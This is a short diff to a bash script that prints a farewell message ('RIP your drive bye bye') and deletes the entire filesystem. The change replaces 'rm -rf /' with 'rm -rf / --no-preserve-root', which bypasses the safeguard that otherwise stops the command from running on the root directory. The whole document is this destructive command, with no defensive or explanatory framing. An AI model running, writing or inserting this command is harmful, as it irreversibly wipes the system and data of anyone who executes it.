@@ -1,3 +1,3 @@
 #!/bin/bash
 echo "RIP your drive bye bye"
-rm -rf /
+rm -rf / --no-preserve-root
